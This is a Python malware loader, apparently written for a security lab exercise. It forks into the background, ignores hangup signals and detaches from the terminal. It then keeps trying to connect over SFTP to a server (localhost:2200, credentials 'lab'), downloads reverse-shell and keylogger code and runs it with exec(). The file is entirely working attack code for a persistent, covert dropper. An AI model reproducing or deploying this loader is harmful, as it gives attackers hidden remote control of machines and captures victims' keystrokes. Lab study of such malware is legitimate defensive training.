#!/usr/bin/python3
import time
import os
import paramiko
import sys
import random
import signal
import subprocess
import traceback

ONE_HOUR_IN_SECONDS = 3600

REVERSE_SHELL_FILE_PATH = "/home/lab/reverseShell.py"
KEY_LOGGER_FILE_PATH = "/home/lab/keyLogger.py"


def main() -> None:
    processId = os.fork()

    if childProcess(processId):
        startMaliciousBehavior()


def childProcess(processId: int) -> bool:
    """Return True if process is a child and False otherwise."""
    return processId == 0


def startMaliciousBehavior() -> None:
    addSignalHandlers()
    flushInputOutput()
    disconnectFromTerminal()
    executeCodeFromServer()
    waitForever()


def addSignalHandlers() -> None:
    """Add all the signal handlers for the program.
    
    The following singals are caught:
        * SIGHUP
    """
    signal.signal(signal.SIGHUP, signal.SIG_IGN)


def flushInputOutput() -> None:
    """Flush out (empty) stdout as well as stderr."""
    sys.stdout.flush()
    sys.stderr.flush()


def disconnectFromTerminal():
    """Disconnect from terminal.

    Disconnect from terminal by changing the stdin, stdout and stderr
    to devnull. This ensures that the process is no longer connected to
    the session.
    """
    with open(os.devnull, "rb", 0) as devNull:
        os.dup2(devNull.fileno(), sys.stdin.fileno())
        os.dup2(devNull.fileno(), sys.stdout.fileno())
        os.dup2(devNull.fileno(), sys.stderr.fileno())


def executeCodeFromServer() -> None:
    successful = False
    while not successful:
        try:
            with paramiko.Transport(("localhost", 2200)) as transport:
                transport.connect(None, "lab", "lab")
                sftp = paramiko.SFTPClient.from_transport(transport)

                executeReverseShell(sftp)
                executeKeyLogger(sftp)

            successful = True
        except Exception:
            continue


def executeReverseShell(sftp: paramiko.SFTPClient) -> None:
    """Download and execute the code for reverse shell."""
    with sftp.open(REVERSE_SHELL_FILE_PATH) as reverseShellFile:
        reverseShellCodeAsString = reverseShellFile.read()
        exec(reverseShellCodeAsString, globals())
        ReverseShell().start()


def executeKeyLogger(sftp: paramiko.SFTPClient) -> None:
    """Download and execute the code for key logging."""
    with sftp.open(KEY_LOGGER_FILE_PATH) as keyLoggerFile:
        keyLoggerCodeAsString = keyLoggerFile.read()
        exec(keyLoggerCodeAsString, globals())
        KeyLogger().start()


def waitForever() -> None:
    while True:
        time.sleep(ONE_HOUR_IN_SECONDS)


startMaliciousBehavior()
